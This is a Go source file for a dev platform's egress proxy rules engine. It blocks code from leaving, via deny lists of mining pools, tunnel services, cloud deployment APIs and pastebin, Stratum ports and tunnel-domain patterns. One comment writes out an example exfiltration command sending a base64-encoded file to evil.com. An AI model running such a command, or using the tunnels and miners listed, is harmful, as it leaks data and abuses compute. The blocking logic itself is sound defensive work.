// SPDX-License-Identifier: BUSL-1.1
// Copyright (c) 2025 ellul.ai. All rights reserved.

// Hotel California Rules Engine
//
// Core principle: code comes in, can't leave.
// GET allowed, POST blocked (except git clone/fetch/pull).

package proxy

import (
	"net/http"
	"os"
	"strings"

	"gopkg.in/yaml.v3"
)

// Rules defines the traffic policy.
//
// Two modes:
//   - "hotel_california" (default): Free tier lockdown. Code comes in, can't leave.
//   - "tunnel_guard": Paid dev tier. Block tunnels + mining only, allow everything else.
type Rules struct {
	// Mode determines enforcement level.
	// "hotel_california" = full free-tier lockdown.
	// "tunnel_guard" = block tunnels + mining only (paid dev tiers).
	Mode string `yaml:"mode"`

	// Platform domains that are always allowed (all methods)
	PlatformDomains []string `yaml:"platform_domains"`

	// Domains blocked even for GET (malware, C2, crypto miners)
	BlacklistedDomains []string `yaml:"blacklisted_domains"`

	// Git content types to block (push only — code can't leave)
	GitBlockedContentTypes []string `yaml:"git_blocked_content_types"`

	// Git content types to allow (clone/fetch/pull — code comes in)
	GitAllowedContentTypes []string `yaml:"git_allowed_content_types"`

	// Max URL length for GET requests to external (non-platform) domains.
	// Prevents data exfiltration via query strings: curl 'https://evil.com/?d=$(base64 file)'
	// 0 = no limit. Default: 2048 bytes.
	MaxExternalURLLength int `yaml:"max_external_url_length"`
}

// Verdict is the result of evaluating a request against the rules.
type Verdict int

const (
	Allow Verdict = iota
	Block
)

// DefaultRules returns the built-in Hotel California rules.
func DefaultRules() *Rules {
	return &Rules{
		Mode: "hotel_california",
		PlatformDomains: []string{
			"ellul.ai",
			"*.ellul.ai",
			"ellul.app",
			"*.ellul.app",
		},
		BlacklistedDomains: []string{
			// Crypto mining pools
			"pool.minergate.com",
			"xmr.pool.minergate.com",
			"moneroocean.stream",
			"*.coinhive.com",
			"*.cryptoloot.pro",
			"*.nanopool.org",
			"*.2miners.com",
			"*.herominers.com",
			"*.hashvault.pro",
			"*.supportxmr.com",
			"*.unmineable.com",
			"*.nicehash.com",
			"*.ethermine.org",
			"*.flexpool.io",
			"*.f2pool.com",
			"*.poolin.com",
			// Cloud Deployment APIs (DNS Blackhole)
			"api.vercel.com", "*.vercel.com", "vercel.com",
			"api.fly.io", "*.fly.io",
			"api.heroku.com", "*.heroku.com", "git.heroku.com",
			"api.railway.app", "*.railway.app",
			"api.render.com", "*.render.com",
			"api.netlify.com", "*.netlify.com",
			"api.cloudflare.com",
			"api.deno.com", "*.deno.com",
			"api.digitalocean.com", "*.digitalocean.com",
			"api.linode.com", "*.linode.com",
			"api.vultr.com", "*.vultr.com",
			"api.hetzner.cloud", "*.hetzner.cloud",
			"*.amazonaws.com", "*.awsapps.com",       // AWS
			"*.googleapis.com", "cloud.google.com",    // GCP
			"*.azure.com", "*.azurewebsites.net",      // Azure
			"*.azurecr.io", "management.azure.com",
			"hub.docker.com", "*.docker.com", "*.docker.io", "ghcr.io",
			"*.workers.dev", "*.pages.dev",
			"*.supabase.co", "*.supabase.com",
			"*.neon.tech", "*.planetscale.com",
			// Tunnel services
			"*.ngrok.com", "*.ngrok.io", "*.ngrok-agent.com",
			"equinox.io",
			"*.trycloudflare.com", "*.argotunnel.com",
			"*.localtunnel.me", "*.loca.lt",
			"localhost.run", "serveo.net", "bore.pub",
			"*.telebit.cloud",
			"*.tailscale.com", "*.zerotier.com",
			"pagekite.net", "burrow.io", "expose.dev", "*.zrok.io",
			// C2 / paste
			"pastebin.com",
		},
		GitBlockedContentTypes: []string{
			"application/x-git-receive-pack-request",
		},
		GitAllowedContentTypes: []string{
			"application/x-git-upload-pack-request",
		},
		MaxExternalURLLength: 2048,
	}
}

// LoadRules loads Hotel California rules from a YAML file.
func LoadRules(path string) (*Rules, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}

	rules := &Rules{}
	if err := yaml.Unmarshal(data, rules); err != nil {
		return nil, err
	}

	return rules, nil
}

// Evaluate checks a request against the traffic rules.
func (r *Rules) Evaluate(req *http.Request) Verdict {
	host := req.URL.Hostname()

	// Platform domains: always allowed (all methods, all modes)
	if r.isPlatformDomain(host) {
		return Allow
	}

	// Blacklisted domains: always blocked (all modes)
	if r.isBlacklisted(host) {
		return Block
	}

	// Block Stratum mining protocol (all modes)
	if isStratumPort(req.URL.Port()) {
		return Block
	}

	// TUNNEL GUARD MODE: blacklist + mining only, everything else passes.
	// Paid dev tiers get full network access except tunnels and mining.
	if r.Mode == "tunnel_guard" {
		return Allow
	}

	// ---- HOTEL CALIFORNIA MODE (free tier) ----

	method := req.Method
	contentType := req.Header.Get("Content-Type")

	// Block WebSocket upgrades to non-platform domains
	if strings.EqualFold(req.Header.Get("Upgrade"), "websocket") {
		return Block
	}

	// GET/HEAD: allowed, but enforce URL length limit on external domains
	// to prevent data exfiltration via query strings
	if method == http.MethodGet || method == http.MethodHead || method == http.MethodOptions {
		if method == http.MethodGet && r.MaxExternalURLLength > 0 {
			fullURL := req.URL.String()
			if len(fullURL) > r.MaxExternalURLLength {
				return Block
			}
		}
		return Allow
	}

	// POST: block git push (code can't leave)
	if method == http.MethodPost {
		for _, ct := range r.GitBlockedContentTypes {
			if strings.Contains(contentType, ct) {
				return Block
			}
		}
	}

	// POST: allow git clone/fetch/pull (code comes in)
	if method == http.MethodPost {
		for _, ct := range r.GitAllowedContentTypes {
			if strings.Contains(contentType, ct) {
				return Allow
			}
		}
	}

	// All other POST/PUT/DELETE/PATCH: BLOCK
	if method != http.MethodGet && method != http.MethodHead && method != http.MethodOptions {
		return Block
	}

	return Allow
}

// isPlatformDomain checks if a host matches any platform domain pattern.
func (r *Rules) isPlatformDomain(host string) bool {
	for _, domain := range r.PlatformDomains {
		if strings.HasPrefix(domain, "*.") {
			// Wildcard match: *.ellul.ai matches sub.ellul.ai
			suffix := domain[1:] // ".ellul.ai"
			if strings.HasSuffix(host, suffix) {
				return true
			}
		} else if host == domain {
			return true
		}
	}
	return false
}

// isStratumPort checks if a port is commonly used by mining pool Stratum protocol.
func isStratumPort(port string) bool {
	stratumPorts := map[string]bool{
		"3333":  true, // Common Stratum
		"4444":  true, // Stratum alt
		"5555":  true, // Stratum alt
		"7777":  true, // Stratum alt
		"8888":  true, // Stratum alt
		"9999":  true, // Stratum alt
		"14444": true, // Stratum TLS
		"45560": true, // MoneroOcean
		"45700": true, // MoneroOcean TLS
	}
	return stratumPorts[port]
}

// isBlacklisted checks if a host matches any blacklisted domain.
func (r *Rules) isBlacklisted(host string) bool {
	for _, domain := range r.BlacklistedDomains {
		if strings.HasPrefix(domain, "*.") {
			suffix := domain[1:]
			if strings.HasSuffix(host, suffix) {
				return true
			}
		} else if host == domain {
			return true
		}
	}
	return false
}

// IsTunnelDomain checks if a CONNECT target looks like a tunneling service.
// Used by the MITM proxy to block CONNECT before the TLS handshake.
func (r *Rules) IsTunnelDomain(host string) bool {
	host = strings.ToLower(host)
	// Strip port if present
	if idx := strings.LastIndex(host, ":"); idx != -1 {
		host = host[:idx]
	}

	// Known tunnel service domain patterns
	tunnelPatterns := []string{
		"ngrok.com", "ngrok.io", "ngrok-agent.com",
		"trycloudflare.com", "argotunnel.com",
		"localtunnel.me", "loca.lt",
		"localhost.run", "serveo.net", "bore.pub",
		"telebit.cloud",
		"tailscale.com", "zerotier.com",
		"pagekite.net", "burrow.io", "expose.dev",
		"zrok.io", "pinggy.io", "packetriot.com",
	}

	for _, pattern := range tunnelPatterns {
		if host == pattern || strings.HasSuffix(host, "."+pattern) {
			return true
		}
	}

	return false
}
